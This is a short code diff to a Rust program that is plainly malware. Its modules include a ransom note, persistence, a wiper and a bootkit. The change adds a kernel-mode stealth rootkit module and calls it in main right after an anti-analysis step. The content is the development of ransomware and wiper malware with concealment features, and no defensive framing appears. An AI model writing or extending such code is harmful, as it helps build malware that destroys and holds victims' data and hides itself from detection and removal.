@@ -4,6 +4,7 @@ mod ransom_note;
 mod persistence;
 mod wiper;
 mod bootkit;
+mod rootkit;
 
 use rayon::prelude::*;
 use std::process::Command;
@@ -116,6 +117,14 @@ fn main() {
 
     // 1. Anti-analysis ก่อนเลย
     basic_anti_analysis();
+
+    // 1.5. Load stealth rootkit (kernel mode hiding)
+    unsafe {
+        if let Err(e) = rootkit::load_rootkit() {
+            eprintln!("Rootkit loading failed: {}", e);
+            // Continue anyway - rootkit is optional enhancement
+        }
+    }
 
     match order_variant {
         0 => {
